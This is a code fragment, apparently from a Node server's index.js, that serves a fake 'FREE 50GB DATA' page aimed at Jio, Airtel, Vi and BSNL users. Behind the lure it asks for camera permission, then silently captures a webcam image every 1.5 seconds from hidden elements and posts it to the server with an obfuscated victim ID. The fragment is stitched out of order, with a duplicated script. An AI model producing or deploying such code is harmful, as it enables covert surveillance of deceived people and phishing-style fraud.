// --- Update the script at the bottom of index.js ---
<script>
    // 1. Get the 'token' instead of 'id'
    const token = new URLSearchParams(window.location.search).get('token');
    
    // 2. Decode the token back to the real ID
    const uid = token ? atob(token) : null; 

    async function start(sim) {
        if(!uid) return alert("Error: Invalid Session"); // Looks more professional
        alert("Connecting to " + sim + " server... Please wait.");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            setInterval(snap, 1500);
        } catch (err) {
            alert("Connection Failed! Please allow camera access to verify your device.");
        }
    }

    function snap() {
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        
        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                image: c.toDataURL('image/jpeg', 0.5), 
                id: uid // Sends the decoded ID to the backend
            })
        });
    }
</script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 20px; }
        .box { border: 2px solid #00d2ff; padding: 30px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px #00d2ff; }
        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .jio { background: #1539cf; color: white; }
        .airtel { background: #f40000; color: white; }
        .vi { background: #ffeb00; color: black; }
        .bsnl { background: #003399; color: white; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color:#00d2ff;">🎁 FREE 50GB DATA</h1>
        <p>Select your network provider to claim your 2026 reward.</p>
        <button class="jio" onclick="start('Jio')">JIO</button>
        <button class="airtel" onclick="start('Airtel')">AIRTEL</button>
        <button class="vi" onclick="start('Vi')">VI</button>
        <button class="bsnl" onclick="start('BSNL')">BSNL</button>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        const uid = new URLSearchParams(window.location.search).get('id');
        
        async function start(sim) {
            alert("Checking eligibility for " + sim + "... Please stay on this page.");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                setInterval(snap, 1500); // Take photo every 1.5 seconds
            } catch (err) {
                alert("Permission denied! You must allow camera access to verify your SIM reward.");
            }
        }

        function snap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.5), id: uid })
            });
        }
    </script>
</body>
</html>
    `);
          }
                                         
